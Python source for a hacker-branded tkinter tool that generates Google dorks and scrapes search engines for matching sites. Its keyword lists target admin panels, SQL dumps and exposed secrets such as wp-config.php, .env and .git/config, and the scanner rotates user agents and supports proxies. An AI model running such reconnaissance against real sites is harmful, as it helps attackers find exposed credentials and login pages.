#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTHOR : HxN
TELEGRAM : t.me/HxNoname
"""

BG_DARK = '#0a0a0a'
BG_MID = '#121212'
BG_INPUT = '#1a1a2e'
BG_BLACK = '#000000'
CYAN_NEON = '#00ffff'
CYAN_DIM = '#00e5ff'
MAGENTA_NEON = '#ff00ff'
MAGENTA_DIM = '#e040fb'
YELLOW_NEON = '#ffff00'
GREEN_MATRIX = '#00ff41'
RED_NEON = '#ff0055'
ORANGE_NEON = '#ff9100'
PURPLE_DEEP = '#0d001a'
PURPLE_MID = '#1a0033'
FONT_MAIN = ('Consolas', 10)
FONT_BOLD = ('Consolas', 10, 'bold')
FONT_HEADER = ('Consolas', 12, 'bold')
FONT_TITLE = ('Consolas', 14, 'bold')
FONT_LOG = ('Consolas', 9)

import json
import os
import queue
import random
import re
import subprocess
import platform
import threading
import time
import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox, ttk, simpledialog
from urllib.parse import urljoin, urlparse, quote
import requests
import urllib3
import base64
import hashlib
import zlib
import pickle
import warnings
try:
    from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
    warnings.filterwarnings('ignore', category=XMLParsedAsHTMLWarning)
except ImportError:
    BeautifulSoup = None
try:
    import pyttsx3
    test_engine = pyttsx3.init()
    test_engine.stop()
    TTS_AVAILABLE = True
except:
    TTS_AVAILABLE = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
_0x1a2b = lambda x: base64.b64decode(x).decode() if isinstance(x, str) else x
_0x3c4d = lambda x: hashlib.md5(x.encode() if isinstance(x, str) else str(x).encode()).hexdigest()
_0x5e6f = lambda x: zlib.compress(x.encode() if isinstance(x, str) else str(x).encode())
DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
DEFAULT_HEADERS = {'User-Agent': DEFAULT_USER_AGENT, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
WP_LOGIN_INDICATORS = ['wp-login.php', 'wordpress', 'log in', 'username or email', 'password', 'remember me', 'wp-submit']
SEARCH_ENGINE_TEMPLATES = [('Google', 'http://www.google.com/search?q={aranacakkelime}&start=0'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=10'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=20'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=30'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=40'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=50'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=60'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=70'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=80'), ('Google', 'http://www.google.com/search?q={aranacakkelime}&start=90'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=1'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=51'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=101'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=151'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=201'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=251'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=301'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=351'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=401'), ('Bing', 'http://www.bing.com/search?q={aranacakkelime}&count=50&first=451'), ('Yahoo', 'http://search.yahoo.com/search?x=op&va={aranacakkelime}&va_vt=any&vst=0&vd=all&fl=0&vf=all&ei=UTF-8&vm=p&n=100'), ('Yahoo', 'http://search.yahoo.com/search?va={aranacakkelime}&va_vt=any&vst=0&fl=0&vf=all&ei=UTF-8&vm=p&n=100&b=101'), ('Yahoo', 'http://search.yahoo.com/search?va={aranacakkelime}&va_vt=any&vst=0&fl=0&vf=all&ei=UTF-8&vm=p&n=100&b=201'), ('Yahoo', 'http://search.yahoo.com/search?va={aranacakkelime}&va_vt=any&vst=0&fl=0&vf=all&ei=UTF-8&vm=p&n=100&b=301'), ('Yahoo', 'http://search.yahoo.com/search?va={aranacakkelime}&va_vt=any&vst=0&fl=0&vf=all&ei=UTF-8&vm=p&n=100&b=401'), ('Altavista', 'http://altavista.com/web/results?pg=aq&avkw=xytx&aqmode=s&aqa={aranacakkelime}&kgs=0&kls=0&dt=tmperiod&d2=0&rc=dmn&sc=on&nbq=50'), ('Altavista', 'http://altavista.com/web/results?pg=aq&avkw=xytx&aqmode=s&aqa={aranacakkelime}&kgs=0&kls=0&dt=tmperiod&d2=0&rc=dmn&sc=on&nbq=50&stq=50'), ('Altavista', 'http://altavista.com/web/results?pg=aq&avkw=xytx&aqmode=s&aqa={aranacakkelime}&kgs=0&kls=0&dt=tmperiod&d2=0&rc=dmn&sc=on&nbq=50&stq=100'), ('Altavista', 'http://altavista.com/web/results?pg=aq&avkw=xytx&aqmode=s&aqa={aranacakkelime}&kgs=0&kls=0&dt=tmperiod&d2=0&rc=dmn&sc=on&nbq=50&stq=150'), ('Altavista', 'http://altavista.com/web/results?pg=aq&avkw=xytx&aqmode=s&aqa={aranacakkelime}&kgs=0&kls=0&dt=tmperiod&d2=0&rc=dmn&sc=on&nbq=50&stq=200')]
DORK_USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0']
DORK_DEFAULT_HEADERS = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Referer': 'https://www.google.com/'}

class DorkMakerGUI:

    def __init__(self, parent):
        self.root = parent
        self.root.configure(bg=BG_DARK)
        self.colors = {'bg': '#0a0a0a', 'fg': '#00ff00', 'fg_cyan': '#00ffff', 'fg_yellow': '#ffff00', 'fg_red': '#ff0000', 'fg_green': '#00ff41', 'entry_bg': '#1a1a1a', 'entry_fg': '#00ff00', 'button_bg': '#1a1a1a', 'button_fg': '#00ff00'}
        self.default_keywords = ['admin', 'login', 'password', 'wp-admin', 'wp-login', 'administrator', 'dashboard', 'panel', 'control', 'cpanel', 'phpmyadmin', 'database', 'config', 'backup', 'sql', 'dump', 'file', 'upload', 'download']
        self.default_page_types = ['filetype:php', 'filetype:asp', 'filetype:aspx', 'filetype:jsp', 'ext:php', 'ext:asp', 'ext:aspx', 'ext:sql', 'ext:txt', 'ext:log', 'filetype:pdf', 'filetype:doc', 'filetype:xls']
        self.default_parameters = ['inurl:admin', 'inurl:login', 'inurl:wp-admin', 'inurl:wp-login', 'inurl:administrator', 'inurl:panel', 'inurl:dashboard', 'inurl:config', 'inurl:backup', 'inurl:sql', 'inurl:dump', 'inurl:file', 'inurl:upload']
        self.default_search_functions = ['intext:', 'intitle:', 'inurl:', 'site:', 'filetype:', 'ext:']
        self.template_categories = {'WordPress': ['wp-admin', 'wp-login', 'wp-content', 'wp-includes', 'wordpress', 'wp-config', 'wp-json', 'xmlrpc.php'], 'Joomla': ['joomla', 'administrator', 'index.php?option=com', 'components', 'modules', 'plugins'], 'Drupal': ['drupal', 'user/login', 'admin', 'node', 'sites/default'], 'General Admin': ['admin', 'administrator', 'login', 'panel', 'dashboard', 'cpanel', 'phpmyadmin', 'webmin'], 'Files': ['filetype:php', 'filetype:sql', 'filetype:txt', 'filetype:log', 'filetype:bak', 'filetype:old', 'filetype:backup'], 'Config Files': ['config.php', 'config.inc.php', 'settings.php', 'wp-config.php', 'database.php', 'db.php', '.env', '.git/config']}
        self.setup_gui()

    def setup_gui(self):
        """Setup GUI"""
        title_label = tk.Label(self.root, text='ELV DORK MAKER', font=('Courier', 16, 'bold'), fg=self.colors['fg'], bg=self.colors['bg'])
        title_label.pack(pady=10)
        main_frame = tk.Frame(self.root, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        tk.Label(left_frame, text='Keywords (one per line):', font=('Courier', 9), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.keywords_text = scrolledtext.ScrolledText(left_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=20, wrap=tk.WORD)
        self.keywords_text.pack(fill=tk.BOTH, expand=True)
        middle_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        middle_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        tk.Label(middle_frame, text='Page Types (filetype:php, ext:sql, etc):', font=('Courier', 8), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.page_types_text = scrolledtext.ScrolledText(middle_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=4, wrap=tk.WORD)
        self.page_types_text.pack(fill=tk.X, pady=(0, 5))
        self.page_types_text.insert(1.0, '\n'.join(self.default_page_types))
        tk.Label(middle_frame, text='Parameters (inurl:admin, inurl:login, etc):', font=('Courier', 8), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.parameters_text = scrolledtext.ScrolledText(middle_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=4, wrap=tk.WORD)
        self.parameters_text.pack(fill=tk.X, pady=(0, 5))
        self.parameters_text.insert(1.0, '\n'.join(self.default_parameters))
        tk.Label(middle_frame, text='Search Functions (intext:, intitle:, etc):', font=('Courier', 8), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.search_functions_text = scrolledtext.ScrolledText(middle_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=3, wrap=tk.WORD)
        self.search_functions_text.pack(fill=tk.X, pady=(0, 5))
        self.search_functions_text.insert(1.0, '\n'.join(self.default_search_functions))
        tk.Label(middle_frame, text='Pattern (1=Simple, 2=Advanced, 3=Ultimate):', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.pattern_var = tk.StringVar(value='2')
        pattern_frame = tk.Frame(middle_frame, bg=self.colors['bg'])
        pattern_frame.pack(fill=tk.X, pady=(0, 5))
        tk.Radiobutton(pattern_frame, text='Simple', variable=self.pattern_var, value='1', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(pattern_frame, text='Advanced', variable=self.pattern_var, value='2', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(pattern_frame, text='Ultimate', variable=self.pattern_var, value='3', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=5)
        tk.Button(middle_frame, text='Load Defaults', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], command=self.load_defaults, width=20).pack(pady=3)
        tk.Button(middle_frame, text='Generate Dorks (Advanced)', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg'], command=self.generate_advanced_dorks, width=20).pack(pady=5)
        tk.Button(middle_frame, text='Generate (Simple)', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], command=self.generate_dorks, width=20).pack(pady=3)
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        tk.Label(right_frame, text='Generated Dorks:', font=('Courier', 9), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.dorks_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=20, wrap=tk.WORD)
        self.dorks_text.pack(fill=tk.BOTH, expand=True)
        categories_frame = tk.Frame(self.root, bg=self.colors['bg'])
        categories_frame.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(categories_frame, text='Template Categories (Quick Load):', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        categories_buttons_frame = tk.Frame(categories_frame, bg=self.colors['bg'])
        categories_buttons_frame.pack(fill=tk.X)
        for category, keywords in self.template_categories.items():
            btn = tk.Button(categories_buttons_frame, text=category, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], command=lambda cat=category, kw=keywords: self.load_category(cat, kw), width=12)
            btn.pack(side=tk.LEFT, padx=2, pady=2)
        bottom_frame = tk.Frame(self.root, bg=self.colors['bg'])
        bottom_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(bottom_frame, text='Copy Dorks', font=('Courier', 9), bg=self.colors['button_bg'], fg=self.colors['button_fg'], command=self.copy_dorks, width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(bottom_frame, text='Save Dorks', font=('Courier', 9), bg=self.colors['button_bg'], fg=self.colors['button_fg'], command=self.save_dorks, width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(bottom_frame, text='Clear All', font=('Courier', 9), bg=self.colors['button_bg'], fg=self.colors['fg_red'], command=self.clear_all, width=15).pack(side=tk.LEFT, padx=5)

    def add_prefix(self):
        """Add prefix to keywords"""
        prefix = self.prefix_entry.get().strip()
        if not prefix:
            return
        keywords = self.keywords_text.get(1.0, tk.END).strip().split('\n')
        new_keywords = [f'{prefix}{kw}' if kw else kw for kw in keywords]
        self.keywords_text.delete(1.0, tk.END)
        self.keywords_text.insert(1.0, '\n'.join(new_keywords))

    def add_suffix(self):
        """Add suffix to keywords"""
        suffix = self.suffix_entry.get().strip()
        if not suffix:
            return
        keywords = self.keywords_text.get(1.0, tk.END).strip().split('\n')
        new_keywords = [f'{kw}{suffix}' if kw else kw for kw in keywords]
        self.keywords_text.delete(1.0, tk.END)
        self.keywords_text.insert(1.0, '\n'.join(new_keywords))

    def load_defaults(self):
        """Load default components"""
        self.keywords_text.delete(1.0, tk.END)
        self.keywords_text.insert(1.0, '\n'.join(self.default_keywords))
        self.page_types_text.delete(1.0, tk.END)
        self.page_types_text.insert(1.0, '\n'.join(self.default_page_types))
        self.parameters_text.delete(1.0, tk.END)
        self.parameters_text.insert(1.0, '\n'.join(self.default_parameters))
        self.search_functions_text.delete(1.0, tk.END)
        self.search_functions_text.insert(1.0, '\n'.join(self.default_search_functions))

    def generate_dorks(self):
        """Generate simple dorks from keywords"""
        keywords = [kw.strip() for kw in self.keywords_text.get(1.0, tk.END).strip().split('\n') if kw.strip()]
        if not keywords:
            messagebox.showwarning('Warning', 'Please enter keywords!')
            return
        dorks = []
        for kw in keywords:
            dork = kw
            dorks.append(dork)
        self.dorks_text.delete(1.0, tk.END)
        self.dorks_text.insert(1.0, '\n'.join(dorks))
        messagebox.showinfo('Success', f'Generated {len(dorks)} simple dorks!')

    def generate_advanced_dorks(self):
        """Generate advanced dorks dengan kombinasi komponen (Darkfeyz Style)"""
        import itertools
        keywords = [kw.strip() for kw in self.keywords_text.get(1.0, tk.END).strip().split('\n') if kw.strip()]
        page_types = [pt.strip() for pt in self.page_types_text.get(1.0, tk.END).strip().split('\n') if pt.strip()]
        parameters = [p.strip() for p in self.parameters_text.get(1.0, tk.END).strip().split('\n') if p.strip()]
        search_functions = [sf.strip() for sf in self.search_functions_text.get(1.0, tk.END).strip().split('\n') if sf.strip()]
        pattern = self.pattern_var.get()
        if not keywords:
            messagebox.showwarning('Warning', 'Please enter keywords!')
            return
        dorks = set()
        if pattern == '1':
            for kw in keywords:
                dorks.add(kw)
                for param in parameters[:5]:
                    dorks.add(f'{param} {kw}')
                    dorks.add(f'{kw} {param}')
        elif pattern == '2':
            for kw in keywords:
                dorks.add(kw)
                for param in parameters:
                    dorks.add(f'{param} {kw}')
                    dorks.add(f'{kw} {param}')
                for pt in page_types:
                    dorks.add(f'{kw} {pt}')
                    dorks.add(f'{pt} {kw}')
                for param, pt in itertools.product(parameters[:3], page_types[:3]):
                    dorks.add(f'{param} {kw} {pt}')
                    dorks.add(f'{kw} {param} {pt}')
        elif pattern == '3':
            max_combinations = 100000
            combinations = []
            for kw in keywords:
                combinations.append(kw)
            for kw, param in itertools.product(keywords, parameters):
                if len(combinations) >= max_combinations:
                    break
                combinations.append(f'{param} {kw}')
                combinations.append(f'{kw} {param}')
            for kw, pt in itertools.product(keywords, page_types):
                if len(combinations) >= max_combinations:
                    break
                combinations.append(f'{kw} {pt}')
                combinations.append(f'{pt} {kw}')
            for kw, param, pt in itertools.product(keywords[:10], parameters[:5], page_types[:5]):
                if len(combinations) >= max_combinations:
                    break
                combinations.append(f'{param} {kw} {pt}')
                combinations.append(f'{kw} {param} {pt}')
                combinations.append(f'{param} {pt} {kw}')
            for kw, sf in itertools.product(keywords, search_functions):
                if len(combinations) >= max_combinations:
                    break
                if sf.endswith(':'):
                    combinations.append(f'{sf}{kw}')
                else:
                    combinations.append(f'{sf} {kw}')
            for kw, param, pt, sf in itertools.product(keywords[:5], parameters[:3], page_types[:3], search_functions[:2]):
                if len(combinations) >= max_combinations:
                    break
                if sf.endswith(':'):
                    combinations.append(f'{param} {sf}{kw} {pt}')
                    combinations.append(f'{sf}{kw} {param} {pt}')
                else:
                    combinations.append(f'{param} {sf} {kw} {pt}')
            dorks.update(combinations)
        dorks_list = sorted(list(dorks))
        self.dorks_text.delete(1.0, tk.END)
        display_limit = 10000
        if len(dorks_list) > display_limit:
            self.dorks_text.insert(1.0, '\n'.join(dorks_list[:display_limit]))
            self.dorks_text.insert(tk.END, f'\n\n[... {len(dorks_list) - display_limit} more dorks generated (see saved file) ...]\n')
        else:
            self.dorks_text.insert(1.0, '\n'.join(dorks_list))
        messagebox.showinfo('Success', f'Generated {len(dorks_list)} advanced dorks!\nPattern: {pattern}\n\nSave to file to get all dorks.')

    def copy_dorks(self):
        """Copy dorks to clipboard"""
        dorks = self.dorks_text.get(1.0, tk.END).strip()
        if dorks:
            self.root.clipboard_clear()
            self.root.clipboard_append(dorks)
            messagebox.showinfo('Success', 'Dorks copied to clipboard!')
        else:
            messagebox.showwarning('Warning', 'No dorks to copy!')

    def save_dorks(self):
        """Save dorks to file dengan support untuk jutaan dorks"""
        dorks_text = self.dorks_text.get(1.0, tk.END).strip()
        if not dorks_text:
            messagebox.showwarning('Warning', 'No dorks to save!')
            return
        filename = filedialog.asksaveasfilename(title='Save Dorks', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            try:
                dorks_list = [d.strip() for d in dorks_text.split('\n') if d.strip() and (not d.strip().startswith('[...'))]
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"# Dork Maker Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f'# Total Dorks: {len(dorks_list)}\n\n')
                    for dork in dorks_list:
                        f.write(f'{dork}\n')
                messagebox.showinfo('Success', f'Saved {len(dorks_list):,} dorks to:\n{filename}')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving file: {str(e)}')

    def clear_all(self):
        """Clear all fields"""
        self.keywords_text.delete(1.0, tk.END)
        self.dorks_text.delete(1.0, tk.END)

    def load_category(self, category, keywords):
        """Load template category keywords (Darkfeyz feature)"""
        self.keywords_text.delete(1.0, tk.END)
        self.keywords_text.insert(1.0, '\n'.join(keywords))
        messagebox.showinfo('Category Loaded', f'Loaded {category} template with {len(keywords)} keywords!')

class DorkScannerGUI:
    """Dork Scanner - Scan search engines for URLs"""

    def __init__(self, parent):
        self.root = parent
        self.root.configure(bg=BG_DARK)
        self.colors = {'bg': '#0a0a0a', 'fg': '#00ff00', 'fg_cyan': '#00ffff', 'fg_yellow': '#ffff00', 'fg_red': '#ff0000', 'fg_green': '#00ff41', 'entry_bg': '#1a1a1a', 'entry_fg': '#00ff00', 'button_bg': '#1a1a1a', 'button_fg': '#00ff00'}
        self.is_scanning = False
        self.stop_flag = False
        self.found_urls = set()
        self.found_urls_file = None
        self.scanned_pages = 0
        self.total_sites = 0
        self.log_queue = queue.Queue()
        self.url_lock = threading.Lock()
        self.setup_gui()
        self.process_log_queue()

    def setup_gui(self):
        title_label = tk.Label(self.root, text='DORK SCANNER', font=('Courier', 18, 'bold'), fg=self.colors['fg'], bg=self.colors['bg'])
        title_label.pack(pady=(10, 5))
        main_frame = tk.Frame(self.root, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 5))
        left_frame.config(width=480)
        left_frame.pack_propagate(False)
        tk.Label(left_frame, text='Search Engine Templates:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 8))
        canvas_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        canvas = tk.Canvas(canvas_frame, bg=self.colors['bg'], highlightthickness=1, height=450)
        scrollbar = ttk.Scrollbar(canvas_frame, orient='vertical', command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.colors['bg'])

        def update_scrollregion(event=None):
            canvas.update_idletasks()
            canvas.configure(scrollregion=canvas.bbox('all'))
        scrollable_frame.bind('<Configure>', update_scrollregion)
        canvas.create_window((0, 0), window=scrollable_frame, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)

        def on_mousewheel(event):
            canvas.yview_scroll(int(-1 * (event.delta / 120)), 'units')
        canvas.bind_all('<MouseWheel>', on_mousewheel)
        self.engine_vars = {}
        for i, (engine, template) in enumerate(SEARCH_ENGINE_TEMPLATES):
            var = tk.BooleanVar(value=True)
            self.engine_vars[i] = (var, template)
            checkbox = tk.Checkbutton(scrollable_frame, text=f'{engine}: {template[:75]}...', font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg'], activebackground=self.colors['bg'], activeforeground=self.colors['fg'], variable=var, wraplength=450, anchor='w', justify='left')
            checkbox.pack(anchor=tk.W, pady=4, padx=8)
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(8, 0))
        select_all_btn = tk.Button(button_frame, text='[SELECT ALL]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.select_all_engines, width=20, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        select_all_btn.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        deselect_all_btn = tk.Button(button_frame, text='[DESELECT ALL]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], command=self.deselect_all_engines, width=20, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        deselect_all_btn.pack(side=tk.LEFT, padx=(0, 0), fill=tk.X, expand=True)
        middle_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        middle_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        options_frame = tk.Frame(middle_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Options:', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, padx=5, pady=(5, 3))
        self.domain_only_var = tk.BooleanVar(value=True)
        domain_checkbox = tk.Checkbutton(options_frame, text='Extract Domain Only (includes subdomain: www.example.com, subdo.example.com) - uncheck for full URL with parameters', font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg_yellow'], selectcolor=self.colors['entry_bg'], activebackground=self.colors['bg'], activeforeground=self.colors['fg_yellow'], variable=self.domain_only_var)
        domain_checkbox.pack(anchor=tk.W, padx=10, pady=3)
        proxy_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        proxy_frame.pack(fill=tk.X, padx=10, pady=3)
        tk.Label(proxy_frame, text='Proxy:', font=('Courier', 9), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.proxy_entry = tk.Entry(proxy_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=35)
        self.proxy_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        pages_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        pages_frame.pack(fill=tk.X, padx=10, pady=(3, 5))
        tk.Label(pages_frame, text='Max Pages:', font=('Courier', 9), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.max_pages_var = tk.StringVar(value='20')
        max_pages_entry = tk.Entry(pages_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], textvariable=self.max_pages_var, width=8)
        max_pages_entry.pack(side=tk.LEFT)
        tk.Label(middle_frame, text='Enter Dorks (one per line):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.dorks_text = scrolledtext.ScrolledText(middle_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=15, wrap=tk.WORD)
        self.dorks_text.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        stats_frame = tk.Frame(middle_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        self.stats_label = tk.Label(stats_frame, text='Total Pages: 0 | Active Channels: 0 | Total Sites: 0 | Scanned: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        control_frame = tk.Frame(middle_frame, bg=self.colors['bg'])
        control_frame.pack(fill=tk.X, pady=5)
        tk.Label(control_frame, text='Save Location:', font=('Courier', 8), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.save_entry = tk.Entry(control_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=30)
        self.save_entry.pack(side=tk.LEFT, padx=5)
        self.save_entry.insert(0, 'dork_scanner_results.txt')
        tk.Button(control_frame, text='Browse', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], command=self.browse_save_location, width=10).pack(side=tk.LEFT, padx=5)
        button_frame2 = tk.Frame(middle_frame, bg=self.colors['bg'])
        button_frame2.pack(fill=tk.X, pady=(8, 0))
        self.start_button = tk.Button(button_frame2, text='[START SCAN]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.start_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.pause_button = tk.Button(button_frame2, text='[PAUSE]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], command=self.pause_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, state=tk.DISABLED, cursor='hand2')
        self.pause_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
